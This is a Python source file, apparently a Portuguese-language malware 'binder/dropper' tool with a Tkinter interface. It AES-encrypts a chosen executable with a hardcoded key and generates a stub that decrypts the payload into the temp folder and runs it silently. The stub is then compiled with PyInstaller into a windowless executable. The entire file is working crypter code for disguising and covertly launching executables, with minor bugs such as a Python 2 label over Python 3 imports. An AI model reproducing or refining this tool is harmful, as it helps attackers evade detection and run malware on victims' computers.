"""
PYTHON 2.X
09/2019
"""

from tkinter import *
import binascii, pyaes, os

new_file = "drop.exe"       # OUTPUT FILE STUB
key = "0123456789abcdef"    # KEY 16 BYTES

def oOpen(original):
    file = open(original, "rb")
    file_data = file.read()
    file.close()
    inicrypt(file_data)

def inicrypt(data):
    global key
    aes = pyaes.AESModeOfOperationCTR(key)
    data_crypted = aes.encrypt(data)
    data_crypted_hexed = binascii.hexlify(data_crypted)
    inis_tub(data_crypted_hexed, key)

def inis_tub(hex, key):
    global new_file
    demi = "import pyaes, subprocess, tempfile\n"
    demi += "data_crypted_hexed = \"" + hex + "\"\n"
    demi += "key = \"" + key + "\"\n"
    demi += "tempdir = tempfile.gettempdir() \n"
    demi += "d_rop = tempdir + \"" + new_file + "\"\n"
    demi += """def wWrite(data, output):
    file = open(output, 'wb')
    file.write(data)
    file.close()

aes = pyaes.AESModeOfOperationCTR(key)
decrypt_hex = data_crypted_hexed.decode('hex')
decrypt_data = aes.decrypt(decrypt_hex)

wWrite(decrypt_data, d_rop)

proc = subprocess.Popen(d_rop, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
"""
    output_sb = "stub.py"
    sb_file = open(output_sb, 'w')
    sb_file.write(demi)
    sb_file.close()
    fFim(output_sb)

def fFim(output):
    global conclu
    os.system("pyinstaller -F -w --clean " + output)
    conclu = 1


class Application:
    def __init__(self, master=None):
        self.container = Frame(master)
        self.container.pack()

        self.container2 = Frame(master)
        self.container2["padx"] = 10
        self.container2.pack()

        self.container3 = Frame(master)
        self.container3["pady"] = 10
        self.container3.pack()

        self.container4 = Frame(master)
        self.container4["pady"] = 10
        self.container4.pack()

        self.title = Label(self.container, text=" .:: Binder / Droper ::.")
        self.title["font"] = ("Arial", "15", "bold")
        self.title["pady"] = 10
        self.title.pack()

        self.local = Label(self.container2, text="Caminho : ")
        self.local.pack(side=LEFT)

        self.ori_file = Entry(self.container2)
        self.ori_file["width"] = 30
        self.ori_file["font"] = ("Arial")
        self.ori_file.pack(side=RIGHT)

        self.bustart = Button(self.container3)
        self.bustart["text"] = "INICIAR"
        self.bustart["font"] = ("Arial", "15", "bold")
        self.bustart["fg"] = "red"
        self.bustart["width"] = 10
        self.bustart["command"] = self.mystart
        self.bustart.pack()

        self.mensagem = Label(self.container4, text="")
        self.mensagem.pack()

    def mystart(self):
        global oOpen
        caminho_file = self.ori_file.get()
        if caminho_file:
            self.mensagem["text"] = caminho_file
            oOpen(caminho_file)
        else:
            self.mensagem["text"] = "ERRO NO CAMINHO DO ARQUIVO"

        if conclu != 0:
            self.mensagem["text"] = "CONCLUIDO"

root = Tk()
Application(root)
root.mainloop()